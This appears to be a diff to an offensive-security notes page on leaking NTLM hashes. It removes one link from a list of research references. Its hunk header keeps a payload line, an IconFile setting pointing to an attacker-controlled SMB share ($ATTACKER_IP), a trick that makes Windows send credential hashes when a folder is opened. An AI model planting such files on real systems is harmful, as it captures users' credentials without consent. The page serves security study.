@@ -207,8 +207,6 @@ IconFile=\\$ATTACKER_IP\something\something.ico
 
 [https://github.com/Gl3bGl4z/All_NTLM_leak](https://github.com/Gl3bGl4z/All_NTLM_leak)
 
-[https://mgp25.com/research/infosec/Leaking-NTLM-hashes/](https://mgp25.com/research/infosec/Leaking-NTLM-hashes/)
-
 [https://www.securify.nl/blog/living-off-the-land-stealing-netntlm-hashes#office](https://www.securify.nl/blog/living-off-the-land-stealing-netntlm-hashes#office)
 
 [https://www.ired.team/offensive-security/initial-access](https://www.ired.team/offensive-security/initial-access)
